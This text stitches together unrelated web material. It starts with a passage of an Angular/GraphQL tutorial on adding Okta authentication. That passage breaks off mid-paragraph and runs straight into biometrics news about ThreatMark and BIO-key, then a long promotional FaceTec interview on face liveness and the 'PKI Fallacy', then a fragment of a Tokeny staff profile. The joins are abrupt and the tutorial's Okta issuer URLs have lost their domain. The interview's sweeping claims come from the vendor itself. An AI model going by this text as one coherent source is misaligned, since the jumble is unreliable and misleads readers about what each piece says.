    &lt;button class="prev" *ngIf="showPrevious()" (click)="onPrevious()"&gt; prev &lt;/button&gt;
    &lt;button class="next" *ngIf="showNext()" (click)="onNext()"&gt; next &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
</code>   

<p>The component displays the character data in a table and provides navigation buttons to page through the results. It also provides links to routes that will display details of a character or its species. You will be implementing those routes later.</p>

<p>The CSS file <code>src/app/browse/browse.component.css</code> can be used to provide some styling to the browse component. Update the contents to the code below.</p>

   <code>.browse {
  width: 100%;
  display: flex;
  flex-direction: column;
  align-items: center;
}

.browse &gt; * {
  width: 100%;
  max-width: 800px;
}

table {
  margin-top: 16px;
  margin-bottom: 16px;
  border-collapse: collapse;
  border: 1px solid #bbbbbb;
}

tr:nth-child(odd) {
  background-color: #dddddd;
}

th, td {
  padding: 4px 8px;
  border-right: 1px solid #bbbbbb;
  border-left: 1px solid #bbbbbb;
}

.prev {
  float: left;
}

.next {
  float: right;
}
</code>   

<p>Now, create the two components that will display the character and species details. Open the terminal again and type in the following commands.</p>

   <code>ng generate component character --module=app
ng generate component species --module=app
</code>   

<p>This will create the files for the two components. Open <code>src/app/character/character.component.ts</code> and paste the following code into it.</p>

   <code>import { Component, OnInit } from '@angular/core';
import { ActivatedRoute } from '@angular/router';
import { CharacterDetail, CharactersService } from '../characters.service';

@Component({
  selector: 'app-character',
  templateUrl: './character.component.html',
  styleUrls: ['./character.component.css']
})
export class CharacterComponent implements OnInit {
  character!: CharacterDetail;

  constructor(private route: ActivatedRoute, private characterService: CharactersService) { }

  ngOnInit(): void {
    this.route.queryParams.subscribe(async (params) =&gt; {
      this.character = await this.characterService.findCharacter(params.name);
    });
  }
}
</code>   

<p>This is a simple component that reads the character’s name from the query parameters in the URL and then uses <code>CharactersService</code> to obtain the character detail. The corresponding template simply shows the queried data. Open <code>src/app/character/character.component.html</code> and copy the following contents into it.</p>

   <code>&lt;div *ngIf=character&gt;
  &lt;p&gt;&lt;strong&gt;Name:&lt;/strong&gt; {{character.name}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Mass:&lt;/strong&gt; {{character.mass}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Hair Color:&lt;/strong&gt; {{character.hair_color}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Skin Color:&lt;/strong&gt; {{character.skin_color}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Eye Color:&lt;/strong&gt; {{character.eye_color}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Birth Year:&lt;/strong&gt; {{character.birth_year}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Gender:&lt;/strong&gt; {{character.gender}}&lt;/p&gt;
&lt;/div&gt;
&lt;a [routerLink]="['/browse']"&gt;Back&lt;/a&gt;
</code>   

<p>The component showing the species information follows the same pattern. Open <code>src/app/species/species.component.ts</code> and update the content to match the code below.</p>

   <code>import { Component, OnInit } from '@angular/core';
import { ActivatedRoute } from '@angular/router';
import { CharactersService, Species } from '../characters.service';

@Component({
  selector: 'app-species',
  templateUrl: './species.component.html',
  styleUrls: ['./species.component.css']
})
export class SpeciesComponent implements OnInit {
  species!: Species;

  constructor(private route: ActivatedRoute, private characterService: CharactersService) { }

  ngOnInit(): void {
    this.route.queryParams.subscribe(async (params) =&gt; {
      this.species = await this.characterService.findSpecies(params.name);
    });
  }
}
</code>   

<p>Next, open <code>src/app/species/species.component.html</code> and paste in the code below.</p>

   <code>&lt;div *ngIf=species&gt;
  &lt;p&gt;&lt;strong&gt;Name:&lt;/strong&gt; {{species.name}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Classification:&lt;/strong&gt; {{species.classification}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Designation:&lt;/strong&gt; {{species.designation}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Hair Colors:&lt;/strong&gt; {{species.hair_colors}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Skin Colors:&lt;/strong&gt; {{species.skin_colors}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Eye Colors:&lt;/strong&gt; {{species.eye_colors}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Average Lifespan:&lt;/strong&gt; {{species.average_lifespan}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Language:&lt;/strong&gt; {{species.language}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Homeworld:&lt;/strong&gt; {{species.homeworld}}&lt;/p&gt;
&lt;/div&gt;
&lt;a [routerLink]="['/browse']"&gt;Back&lt;/a&gt;
</code>   

<p>I already mentioned how the Angular router is responsible for deciding which component to render, based on the path in the URL. In the file <code>src/app/app-routing.module.ts</code> you can define these associations.</p>

   <code>import { NgModule } from '@angular/core';
import { RouterModule, Routes } from '@angular/router';
import { HomeComponent } from './home/home.component';
import { BrowseComponent } from './browse/browse.component';
import { CharacterComponent } from './character/character.component';
import { SpeciesComponent } from './species/species.component';

const routes: Routes = [
  {
    path: '',
    component: HomeComponent
  },
  {
    path: 'browse',
    component: BrowseComponent,
  },
  {
    path: 'character',
    component: CharacterComponent,
  },
  {
    path: 'species',
    component: SpeciesComponent,
  },
];

@NgModule({
  imports: [RouterModule.forRoot(routes)],
  exports: [RouterModule]
})
export class AppRoutingModule { }
</code>   

<p>You are now ready to test the application. Make sure your server is running as described in the previous section. Then open a terminal in the client Angular project folder and run the following command.</p>

   <code>ng serve
</code>   

<p>Open your browser, navigate to <code>http://localhost:4200</code> and you should see the homepage of your app. You can use the navigation bar to go to the browse page. You should see something like the image below.</p>

<p></p>

 Integrate OIDC for auth 

<p>Every good application needs some user control. Okta lets you add user authentication easily to your application.</p>

<p>Before you begin, you’ll need a free Okta developer account. Install the <a href="https://cli.okta.com">Okta CLI</a> and run <code>okta register</code> to sign up for a new account. If you already have an account, run <code>okta login</code>.
Then, run <code>okta apps create</code>. Select the default app name, or change it as you see fit.
Choose Single-Page App and press Enter.</p>

<p>Use <code>http://localhost:4200/login/callback</code> for the Redirect URI and set the Logout Redirect URI to <code>http://localhost:4200</code>.</p>


  What does the Okta CLI do?
<p>The Okta CLI will create an OIDC Single-Page App in your Okta Org. It will add the redirect URIs you specified and grant access to the Everyone group. It will also add a trusted origin for <code>http://localhost:4200</code>. You will see output like the following when it’s finished:</p>
   <code>Okta application configuration:
Issuer:    https://dev-133337.okta.com/oauth2/default
Client ID: 0oab8eb55Kb9jdMIr5d6
</code>   
<p>NOTE: You can also use the Okta Admin Console to create your app. See <a href="https://developer.okta.com/docs/guides/sign-into-spa/angular/create-okta-application/">Create an Angular App</a> for more information.</p>



<p>Make a note of the <code>Issuer</code> and the <code>Client ID</code>. You will need them in the next steps.</p>

 Add JWT authentication to the server 

<p>Adding authentication to the server is easy. Open a terminal in the server’s project folder and install a few more dependencies by running the following command.</p>

   <code>npm i -E @okta/jwt-verifier@2.3.0 express-bearer-token@2.4.0
</code>   

<p>Now, create a new file <code>auth.js</code> with the content below.</p>

   <code>const OktaJwtVerifier = require('@okta/jwt-verifier');

const oktaJwtVerifier = new OktaJwtVerifier({
  clientId: '{yourClientID}',
  issuer: '/oauth2/default'
});

module.exports = async function oktaAuth(req, res, next) {
  try {
    const token = req.token;
    if (!token) {
      return res.status(401).send('Not Authorized');
    }
    await oktaJwtVerifier.verifyAccessToken(token, 'api://default');
    next();
  }
  catch (err) {
    return res.status(401).send(err.message);
  }
};
</code>   

<p>This module exports an Express middleware that checks the bearer token of an incoming request and verifies its validity. To use this middleware, open <code>app.js</code> and add the following <code>require</code> statements to the top of the file.</p>

   <code>const bearerToken = require('express-bearer-token');
const oktaAuth = require('./auth');
</code>   

<p>Then, update the creation of the Express server with the declaration of the middleware to match the following.</p>

   <code>const app = express()
  .use(cors())
  .use(json())
  .use(bearerToken())
  .use(oktaAuth);
</code>   

<p>The <code>bearerToken</code> middleware extracts the bearer token from a request header. <code>oktaAuth</code> then checks the token. You can now run <code>node app.js</code> again to start the server. Only now, if you try to access the API you will get a <code>401 Unauthorized</code> error response from the server.</p>

 Add Okta to Angular 

<p>To allow the client to access the GraphQL API, you need to also add Okta authentication to the Angular application. Open a terminal in the client’s project folder and install the <code>okta-angular</code> dependency by running the following command.</p>

   <code>npm install -E @okta/okta-angular@4.1.0
</code>   

<p>Open <code>src/app/app.module.ts</code> and create an <code>OktaAuth</code> instance by adding the following lines after the existing import statements.</p>

   <code>import { OKTA_CONFIG, OktaAuthModule } from '@okta/okta-angular';
import { OktaAuth } from '@okta/okta-auth-js';

const config = {
  issuer: '/oauth2/default',
  clientId: '{yourClientID}',
  redirectUri: window.location.origin + '/login/callback'
}
const oktaAuth = new OktaAuth(config);
</code>   

<p>Make sure to replace the <code>{...}</code> placeholders with your OIDC app settings.</p>

<p>Next, add <code>OktaAuthModule</code> to the array of <code>imports</code> in the <code>NgModule</code> configuration.</p>

   <code>@NgModule({
  ...
  imports: [
    ...
    OktaAuthModule
  ],
  ...
})
</code>   

<p>Also, create a new <code>providers</code> property that configures the module by pasting the code below after the <code>imports</code> array.</p>

   <code>providers: [{ provide: OKTA_CONFIG, useValue: { oktaAuth }}],
</code>   

<p>You now need to configure the router to accept the login callback from Okta. Open <code>src/app/app-routing.module.ts</code> and add the following import statement to the top of the file.</p>

   <code>import { OktaAuthGuard, OktaCallbackComponent } from '@okta/okta-angular';
</code>   

<p>Update the <code>routes</code> configuration object to match the code below.</p>

   <code>const routes: Routes = [
  {
    path: '',
    component: HomeComponent
  },
  {
    path: 'browse',
    component: BrowseComponent,
    canActivate: [ OktaAuthGuard ]
  },
  {
    path: 'character',
    component: CharacterComponent,
    canActivate: [ OktaAuthGuard ]
  },
  {
    path: 'species',
    component: SpeciesComponent,
    canActivate: [ OktaAuthGuard ]
  },
  {
    path: 'login/callback',
    component: OktaCallbackComponent
  },
];
</code>   

<p>Here you have added the <code>OktaAuthGuard</code> to the three routes that display character data. When a user who isn’t logged in attempts to access these routes, they will now automatically be redirected to the Okta sign-in page before gaining access.</p>

<p>In the last section, you added authentication to the server. This means that any access to the server now needs to provide an access token. To provide this token, open <code>src/app/graphql.module.ts</code> and replace the existing <code>createApollo</code> function with the implementation below.</p>

   <code>import { setContext } from '@apollo/client/link/context';
import { OktaAuth } from '@okta/okta-auth-js';

const uri = 'http://localhost:4201/graphql'; 
export function createApollo(httpLink: HttpLink, oktaAuth: OktaAuth): ApolloClientOptions&lt;any&gt; {
  const http = httpLink.create({ uri });
  const auth = setContext(async (_, { headers }) =&gt; {
    const token = oktaAuth.getAccessToken();

    return token ? { headers: { Authorization: `Bearer ${token}` } } : {};
  });

  return {
    link: auth.concat(http),
    cache: new InMemoryCache()
  };
}
</code>   

<p>The function now expects an <code>OktaAuth</code> instance as the second argument. This means that you have to add it to the <code>deps</code> array in the <code>NgModule</code> provider for the Apollo options. Update the <code>deps</code> array to match the following.</p>

   <code>deps: [HttpLink, OktaAuth]
</code>   

<p>Finally, you want to provide feedback to the user’s sign-in status and also provide manual ways of logging in and out of the application. Open <code>src/app/navbar/navbar.component.ts</code> and replace its contents with the code below.</p>

   <code>import { Component } from '@angular/core';
import { OktaAuthStateService } from '@okta/okta-angular';
import { OktaAuth } from '@okta/okta-auth-js';

@Component({
  selector: 'app-navbar',
  templateUrl: './navbar.component.html',
  styleUrls: ['./navbar.component.css']
})
export class NavbarComponent {
  
  constructor(public authStateService: OktaAuthStateService, private oktaAuth: OktaAuth) {}

  async login() {
    await this.oktaAuth.signInWithRedirect();
  }

  async logout() {
    await this.oktaAuth.signOut();
  }

}
</code>   

<p>The <code>OktaAuthStateService</code> can be queried to provide the user’s status. The callbacks <code>login()</code> and <code>logout()</code> can be used to sign the user in and out. Now, open <code>src/app/navbar/navbar.component.html</code> and add the following lines as the first element inside the <code>&lt;nav&gt;</code> element.</p>

   <code>&lt;div&gt;
  &lt;button *ngIf="!(authStateService.authState$ | async)?.isAuthenticated" (click)="login()"&gt;Login&lt;/button&gt;
  &lt;button *ngIf="(authStateService.authState$ | async)?.isAuthenticated" (click)="logout()"&gt;Logout&lt;/button&gt;
&lt;/div&gt;
</code>   

<p>This will show a Login button if the user is not logged in and a Logout button if the user is logged in.</p>

<p>Congratulations! You have completed the implementation of an Angular app that consumes GraphQL from a Node/Express server. The application is secured with Okta’s authentication service. You can now start the app by running <code>ng serve</code> in your project folder. Make sure the server is also running as described above. Open your browser to <code>http://localhost:4200</code> to open the app. When you click on Browse in the navigation bar, you will be taken to the Okta sign-in page. Once you logged in, you will be redirected to the character browser. You should see something like the image below.</p>

 Learn more about Angular, GraphQL, and single-page applications 

<p>In this tutorial, I have shown you how to create a single-page application that consumes a GraphQL API using Angular. You’ve seen how to create a GraphQL schema that describes the queries and the results that the server supplies.</p>

<p>GraphQL provides a flexible way of implementing APIs that can be extended without breaking existing clients. Clients can specify the data they want to receive and can combine multiple requests into a single query. This makes GraphQL faster than traditional REST APIs because the number of API calls can be greatly reduced.</p>

<p>The app you have written consists of a server and a client. The server uses Express to parse incoming requests before passing them to the GraphQL middleware. The client is built using Angular and uses the Apollo library to interface with the GraphQL API.

<p><a href="https://www.threatmark.com/">ThreatMark</a> has raised some significant capital and appointed a new CEO as the anti-fraud company positions to expand its market presence.</p>



<p>The firm has announced that it has raised $3 million in a funding round led by Springtide Ventures, indicating in a statement that the capital will help to fuel ThreatMark’s expansion in the European and North American markets. Seasoned tech executive Daniel Rawlings, meanwhile, is the company’s new CEO and President.</p>



<p>Rawlings comes to the company from a previous position as Chief Commercial Officer of Trustonic, another <a href="https://findbiometrics.com/trustonic-crypto-library-fips-140-2-409112/">digital security specialist</a>. He has also held Chief Revenue Officer positions with Tyfone, ID Analytics, and SMSI; and he has served in VP roles with Oracle, Perfect Commerce, and SAP. Rawlings was previously in the position of CEO in his term with SourcingLink, from 2001 to 2003.</p>



<p>In taking his position with ThreatMark, Rawlings is taking the reins from co-founder and <a href="https://findbiometrics.com/interview-threatmark-ceo-michal-tresner-on-behavioral-fraud-prevention/">previous CEO Michal Tresner</a>, who will stay on as Chairman of the Board and will also take on the role of Chief Product Officer &amp; Head of Solution Strategy. Commenting on the appointment, Tresner framed it as a very important step forward for the company.</p>



<p>“Dan’s appointment is the result of an extensive global talent search we conducted to find just the right person, and I am delighted to have Dan join the company,” he said. “The experience, industry expertise and relationship network that Dan brings to ThreatMark is a big step forward for us. Now we’re stronger and better equipped to help our customers around the world succeed in preventing digital fraud both today and in the future.”</p>



<p>As for Springtide Ventures’ interest, the firm’s COO, David Marek, explained that with digital fraud being a critical threat for the financial services industry, “ThreatMark is perfectly positioned to lead the market with their advanced solution.” That solution is designed to analyze behavioral biometrics and other data patterns to assess fraud risks in online transactions, and <a href="https://findbiometrics.com/forrester-praises-threatmark-fraud-prevention-capabilities-030807/">received praise from Forrester</a> earlier this year in its “Now Tech: Enterprise Fraud Management” report.</p>

<p><a href="https://www.bio-key.com/">BIO-key</a> is continuing its road trip with a stop at the <a href="https://events.educause.edu/annual-conference">2021 EDUCAUSE Conference</a> in Philadelphia. The company has already attended two conferences in October, after putting in appearances at the <a href="https://findbiometrics.com/bio-key-brings-portalguard-nascio-conference-101301/">NASCIO Conference</a> and <a href="https://findbiometrics.com/bio-key-brings-biometric-hardware-software-connectid-100106/">Connect:ID</a> earlier this month.</p>



  



<p>The EDUCAUSE Conference is dedicated to higher learning, and will run from October 26-29 at the Pennsylvania Convention Center. The event gives educators a chance to talk about the issues that are affecting the industry, and to view solutions that can potentially address them.</p>



<p>For its part, BIO-key noted that cybersecurity has become a pressing concern, since academic institutions (like virtually every other institution) faced a <a href="https://findbiometrics.com/lexisnexis-risk-solutions-warns-about-rising-bot-attacks-latest-cybercrime-report-022308/">growing volume of cyberthreats</a> when they transitioned to a remote work and remote learning environment. Academic institutions now need a way to protect their students without disrupting their core educational mission.</p>



<p>That’s why BIO-key will specifically be showcasing its PortalGuard IAM platform, which can help simplify an organization’s cybersecurity set-up. To that end, the platform enables <a href="https://findbiometrics.com/bio-key-extends-portalguard-coverage-with-new-sso-concierge-062306/">Single Sign-on capabilities</a> for a number of different applications, and supports more than 16 different authentication options (including <a href="https://findbiometrics.com/bio-keys-palmpositive-solution-gets-technology-innovation-award-071604/">biometric options</a>) for those who want to <a href="https://findbiometrics.com/bio-key-adds-new-passwordless-authentication-features-portalguard-idaas-platform-020301/">move away from passwords</a>. Those features have made PortalGuard extremely popular with academic institutions, to the point that more than 200 <a href="https://findbiometrics.com/bio-key-deploys-portalguard-rio-hondo-college-060309/">higher</a> <a href="https://findbiometrics.com/barstow-community-college-becomes-bio-keys-latest-portalguard-customer-042304/">learning</a> <a href="https://findbiometrics.com/bio-key-provides-portalguard-southeastern-illinois-college-012705/">facilities</a> are now using the service.</p>



<p>“Now more than ever we need to come together to transform the education sector and ensure that the right cybersecurity safety measures are put into place,” said PortalGuard President Mark Cochran. “We look forward to connecting with higher education IT professionals to discuss how we can help evolve their cybersecurity strategies together, giving them IAM solutions that are built for them, delivered with the resources they have today.”&nbsp;&nbsp;</p>



<p>PortalGuard will be conducting demos of PortalGuard at booth 638, in addition to participating in Q&amp;A sessions throughout the event. The platform also has a self-service password reset feature that can help reduce the number of calls to the IT department.</p>

<p>Amid booming interest in mobile biometric identity verification solutions, <a href="https://www.facetec.com/">FaceTec</a> has made a name for itself as an industry leader with its technological innovation and its transparency. With its 3D face authentication technology, FaceTec became a pioneer in the realm of liveness detection as the first vendor to achieve lab-tested compliance with the second level of ISO 30107-3 presentation attack detection standard. Since then, the company has gone further, backing up its own claims about the efficacy of its technology with <a href="https://findbiometrics.com/100k-biometric-spoof-bounty-facetec-ceo-kevin-alan-tussy-interview-part-1-908148/">an ongoing spoof bounty program</a> that can pay out up to $100,000.</p>



<p>The company’s transparency can also be seen in its vocal industry leadership. FaceTec has sought to clearly explain its philosophical approach to identity verification and authentication, and laid out grounded arguments about why this approach is superior to certain others promoted in the identity space.</p>



<p>This proselytizing effort continues in a new interview with FaceTec’s Senior Vice President of North American Operations, Jay Meier. The conversation touches on important topics including the aforementioned booming market growth and the impact of the COVID-19 pandemic, but its central focus is on what FaceTec’s leadership have dubbed ‘the PKI Fallacy’ – an approach to authentication that Meier finds deeply problematic. Read on to find out exactly why, and for other insights from one of the industry’s leading voices.</p>



 Read the full interview with Jay Meier, Senior Vice President of North American Operations at FaceTec: 



<p>FindBiometrics: Activity in the market is the highest it’s ever been, and every indication is it’s likely to continue to grow at a rapid pace. How has this been affecting FaceTec?</p>



<p>FaceTec: It’s no surprise to me, as I’ve been watching companies in this space for two decades waiting for this wave to crash. The time has finally come. Biometrics can deliver remote digital identity with a high confidence. I think the big surprise is that folks just don’t understand how big the market is for this technology. It’s going to be like this for a long time.</p>



<p>FaceTec has grown tremendously since our first product was launched in 2018. However, the pandemic caused a broad global revelation that most credentialing and logical access control systems simply don’t work in 100 percent remote scenarios. It’s interesting because I have known what was wrong for a long time, but stakeholders ignored those of us who were saying you are not your device, and your device is not you. Suddenly, after the pandemic exposed the absolute need for in-person interactions to make these identity systems function, stakeholders have now learned that identity verification and authentication are at the heart of cybersecurity and data breach, fraud, and identity theft prevention.</p>



<p>FaceTec’s software solves critical problems that were exposed during the pandemic and won’t be going away because remote access is now a necessity. We have hundreds of customers, and their success proving liveness remotely for over 250 million people demonstrates that our architecture is the correct one. And as a result of that architecture, our growth rate has been shocking, frankly. We recently recorded quarterly annualized revenue and user growth rates of close to 300 percent.</p>



<p>FindBiometrics: From what you can see, do you think there is any correlation between the increased levels of biometrics education and awareness, and increased biometrics-related activity levels, now that we’re all spending more time in digital environments?</p>



<p>FaceTec: I suspect that the correlation coefficient is approaching 1.0. Truly strong, liveness-proven face biometrics are very clearly showing to be the best solution to hacking, data theft, online fraud, and identity theft. However, governments, enterprise, and consumers have come to realize this in a short time period, only about 18 months. Not only must they come to understand what’s wrong with what they thought was an adequate identity solution, but they also must learn exactly why strong, liveness-proven face biometrics is the only future-proof solution, and how to implement it.</p>



<p>You know, for decades the enterprise stakeholders have insisted that user friction cannot impede revenue. So they purchased solutions that were easy and cheap to deploy, but that focused more on an invisible user experience than the necessary security. And, of course, suppliers happily sold them what they wanted, and still do. But that’s not going to cut it anymore; companies don’t want to have to explain to their customers and regulators how they got hacked so easily. The truth is that most of them couldn’t understand why it wasn’t working. But, boy oh boy, they now know. Banks can no longer buy an identity verification system that just checks the regulatory compliance boxes, like so many of today’s IDV vendors peddle. Seriously, most of these systems do little more than satisfy a regulatory requirement and create a honeypot. When the laws were written, the regulators didn’t know what was missing from their compliance requirements, and that’s why money laundering hasn’t been curbed. But on the other hand, it’s exciting because now we have the tech to solve the problems and a great opportunity to educate, which we are doing at the highest levels with groups like ENISA, NIST, ISO, FinCEN, and many others.</p>



<p>FindBiometrics: Not long ago, you presented a critical analysis of what has become an accepted identity verification approach, and it has gotten some notice and has started some interesting conversations within the industry. Can you please recap the PKI Fallacy and why you believe it requires the industry’s immediate attention?</p>



<p>FaceTec: The PKI Fallacy is a false logic progression suggesting that if we can deterministically authenticate a device, somehow the device user/holder is also known. We use cryptography to secure data at rest and in transit. And cryptography works great for its intended use. However, the devices that cryptography secures are really just portals through which living human beings access valuable privileges, assets, services, and data. So it’s not enough to ensure the integrity of the connection between devices. We need to ensure that the correct, living human being is holding the device before granting access. The problem is that unless you actually can prove – with a high confidence – that it’s the correct living person holding the device, you presume to trust it’s the right person. Well, cryptography wasn’t designed to do this. It cannot do this. Yet, we’ve largely been convinced it does.</p>



<p>FindBiometrics: Does the general adherence to the legacy approach to digital identification that underlies the PKI Fallacy tell us anything about how it might be contributing to growing data breaches?</p>



<p>FaceTec: This industry is too wrapped up in the mathematical proofs to see the vulnerability between the device and the person holding the device. There are “verifiers” which are used to vet the privilege holder. If someone applies for a privilege, like unemployment insurance as John Smith, we need to verify that this particular John Smith actually exists and that this person is, in fact, the corresponding John Smith. Then we bind a strong, liveness-proven 3D FaceMap to the identity profile for this John Smith, and can then use the bound biometric data to verify that this is the correct John Smith for every subsequent access attempt. Of course, this is in the digital realm so we must also ensure the integrity of the devices that collect and process the biometric data. So we verify the device is real, the camera feed is real, perhaps that we’ve seen the device before, and only then will we authenticate the user as the correct John Smith.</p>



<p>But what if we had only bound John Smith to a device? If we register a computer as “John Smith’s Computer”, and then that computer shows up, does that prove that John Smith is using it? Of course not, but that is literally what is being assumed with PKI. That’s the PKI Fallacy, and it’s obviously not going to solve the challenges we have with remote digital identity verification. Unless the user’s identity verification is performed, then anyone with the device or the user’s credentials can access the system masquerading as the real user. So any authentication system is only as secure as the user authentication component, stand-alone. Not proving the identity of the user who was accessing the systems is exactly what happened with the SolarWinds breach, and shows, without question, that these attacks scale.</p>



<p>The truth is, until recently biometrics weren’t accurate enough and liveness wasn’t strong enough, so other methods were used in lieu of strong user authentication. Organizations started using the word “identity” in their names, but they had literally never verified an actual human, only devices. It was a slippery slope of semantics, and it’s caused a lot of confusion. A device, a token, a password, a PIN, etc., are all at least one degree separated from the entitled human privilege holder and, therefore, can be possessed by a different human who was not assigned the privilege. But because the biometrics weren’t where they needed to be, we all had to rely on device authentication that was posing as user authentication. Today, the two are literally conflated. This enabled rampant pandemic stimulus payment and unemployment fraud, and more and more breaches will happen until human users are verified as a prerequisite for access. It’s so very bad that standards groups purporting to advocate strong user authentication literally describe authenticators, like passwords, SMS messages, and in-device biometric sensors, as “verifying your identity”!</p>



<p>Let’s touch on why in-device biometrics are anonymous. And, as of right now Apple’s Touch ID and Face ID biometric systems are not bound to an actual legal identity, for example. Neither are Samsung’s, Huawei’s, or any other in-device biometrics. A good rule of thumb is, if the biometric sensor unlocks the device, or there is a PIN that overrides it, then it’s not suitable for legal user identity verification. The sensors don’t know whose biometrics are enrolled during registration. If the phone doesn’t know what legal identity the biometric data is collected from, the relying party cannot actually know who’s holding the phone. I’m not saying they’re useless. They’re great for convenience. But I am saying they don’t perform an identity verification like most people think they do.</p>



<p>FindBiometrics: Being truly successful in this business is largely predicated on staying ahead of the bad guys. Since they are becoming more sophisticated, more organized, and have better resources, strongly authenticating a device – but weakly authenticating the legitimate user has already proven to be eminently exploitable, like with the now-infamous SolarWinds breach you mentioned. What is the solution to the issues highlighted by the PKI Fallacy?</p>



<p>FaceTec: Well, as noted, the problem is that we use non-existent user authentication, but think that strong device authenticators have us covered. It’s comical that many solution providers advocate more and more device authentication to solve the problem of weak user authentication. Doing the same thing over and over expecting a different result. The answer is to use truly strong user authentication first, and then for even more confidence add a layer of strong device authentication.</p>



<p>We already know if an authenticator is one-degree separated from the user, it’s inherently vulnerable to be shared or stolen. The only authentication method that cannot be used by an imposter is an accurate, liveness-proven biometric match, so let’s start there. Consider how humans communicate with one another: we see, are seen, talk, and listen. That’s the natural human interface and where computers are evolving toward. “Hey Siri!” or “Alexa!” are good examples. However, we need to see what we’re doing to interact with a camera, so for face matching we need a screen. I see biometric authenticators leveraging and binding our face and voice biometrics to our legal identities. Legal identity databases of face images already exist for exactly this purpose. Passports, driver licenses, national ID cards, employee badges, and other credentialing systems already show faces. So face is going to be the primary authenticator, and is now proving evident as governments are increasingly focused on face. And, given the right environmental circumstances, voice biometrics could be bound to the trusted face biometric and then be used in the background to continuously re-authenticate the user while they speak. Microphones, speakers, cameras, and screens are ubiquitous.</p>



<p>How does the biometric need to work? First and foremost, we must ensure the subject is, in fact, alive and literally physically present in front of the camera. Liveness was the biggest hurdle, and the missing piece. Today, it seems like everyone has whipped up their own liveness checks, but not all liveness systems are equal. Most are merely a nuisance for fraudsters, but others can really provide a brick wall for bad actors. FaceTec has been developing liveness AI for over seven years, and to achieve the security levels required, a new modality needed to be developed.</p>



<p>The process works like this: first we need the liveness data and face matching data to be captured concurrently from the same data feed. So the 3D Liveness data and 3D face data are captured together in our architecture. This limits potential attacks, speeds capture to reduce friction and session abandonment, and provides a much stronger result confidence. Biometric matching outcomes are “probabilistic” predictions, so there is always a 1-in-X chance that the comparison is wrong at the chosen false reject rate. Inarguably, measuring more and more diverse data increases the match confidence. More data collected informs the AI’s decision better, allowing us to trust the comparison results more. This is why FaceTec captures three-dimensional face data that includes both the liveness signal and matching data. We call this a 3D FaceScan. These contain orders of magnitude more data than a 2D face template, providing matching confidence far higher than any 2D system.</p>



<p>In the past, groups like FIDO argued that biometric data should never leave the device, suggesting it’s too risky to transmit to a server. Moreover, they argued that anonymous biometrics are good enough. Others, like FaceTec, advocated and continue to advocate encrypting and then transmitting the biometric data over HTTPS to be processed behind the service provider’s firewall. This model requires less trust in the user-provided device, provides unlimited computational horsepower and storage for unlimited neural network models, and thus provides a higher match confidence than any in-device biometric sensor can provide.</p>



<p>Sending the biometric data to the server also allows us to bind the liveness-proven 3D FaceMap to a user profile, account, or identity, and authenticate to that verified and proven identity again and again, creating a chain of trust. By binding biometric data to an actual legal identity, rather than a device, we actually know who we are providing access to, and we can check to see if that 3D FaceMap is already in the database, potentially under a different name. You can’t do that on the device.</p>



<p>At FaceTec, we understand the risks of centralized systems, so we ensure that our partners and customers have data sovereignty; meaning that FaceTec never receives, stores, or processes any biometric data or personally identifiable information (PII). FaceTec’s software is run inside the customer’s firewall and their data stays 100 percent under their control. Our Device SDK software encrypts the 3D FaceScan file on the device to ensure its security in transit, and only once the encrypted biometric data is safely behind the service provider’s firewall, the data is decrypted and the liveness is confirmed or denied. Our best practices have the servers immediately deleting that liveness data, reducing the ability for it to ever be replayed in the future. Lacking the required liveness data, the remaining 3D FaceMap cannot be successfully resubmitted if, for example, it was stolen. This mitigates proverbial honeypot risks, and protects users from their data being reused to gain unauthorized access.</p>



<p>FindBiometrics: A lot of this seems related to foundational components of maturing mobile ID technologies. With broadly available mobile ID on the horizon, how do you expect the identity landscape to change in the near future?</p>



<p>FaceTec: You are who your government says you are. They issue an official birth certificate when you’re born, and it includes the name your parents chose for you and other attributes of who you are. In the U.S., the government also issues a Social Security number at birth. Other governments issue national ID cards. They also issue a driver license, a de facto national ID, after passing a test, allowing you to drive a car. If you want to change your name, you need government approval. Government issues an official death certificate when you die. The government is the original issuer and arbiter of who we are identified as. This is not something an organization of any other kind can do, particularly if these identifiers are to be used with any international credibility.</p>



<p>We use all of this to verify and authenticate ourselves in the real world…except on the internet, the wild-west of identity management. We can’t tell if you are who you say you are online.</p>



<p>How do we prove who we are in the digital world when our identity credentials are physical documents? A digital copy of the physical credential? Well, that’s pretty easily faked. The U.S. Department of Homeland Security intercepts hundreds-of-thousands of factory-made fake drivers licenses every year; and compounding this problem even further, mobile driver licenses (mDL) will soon be widely available and used online to verify the existence of a legal identity. Those credentials are secured by strong cryptography just like devices. However, this still leaves that pesky PKI Fallacy unaddressed.</p>



<p>Your biological identity is bound to your legal identity by your government, so you are who the government says you are, in person and online. And binding a liveness-proven biometric to a user profile is the best way to verify who is actually using the device. It seems logical to bind our biometrics to an official government issued and verified legal identity and authenticate to it.</p>



<p>At FaceTec, we see the future of identity verification and authentication going completely digital, meaning no physical documents are required, as more legal identity issuers become digital verifiers. This will allow identity verification from any device from anywhere. When you go to access your privileges, assets, services, etc., your liveness-proven 3D FaceMap will be compared to the trusted photos of you in the identity issuers database, and verified. Then, all subsequent sessions won’t just be user authentications, they will be legal identity verifications each time, as well.</p>

			 Eloi Garrido is Full Stack Developer at Tokeny Solutions.&nbsp; 

		 
	 

	 
		 
			 Who are you? 
<p>My name is Eloi Garrido. I graduated as an electronics engineer with a master’s degree in embedded systems from Delft University of Technology (NL) and right away moved into programming. I lived in the Netherlands for several years, where I met my partner, and after several attempts I managed to convince her to come to the sunny south. Since my early years, I’ve been interested in technology and tinkering with anything that has a spark. Still, to this day, my parents blame me for any appliance that has stopped working at home.</p>
 How did you land at Tokeny Solutions? 
